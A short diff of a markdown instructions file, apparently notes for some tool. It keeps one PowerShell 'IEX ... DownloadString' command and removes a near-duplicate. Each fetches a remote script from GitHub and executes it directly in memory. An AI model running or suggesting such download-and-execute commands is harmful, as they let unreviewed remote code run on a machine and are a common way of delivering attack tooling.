@@ -26,7 +26,6 @@ If already running:
 
 ```IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/conma293/mvp/main/1.ps1')```
 
-```IEX ((New-Object System.Net.webclient).DownloadString('https://raw.githubusercontent.com/conma293/mvp/main/1.ps1')).content```
 
 
 
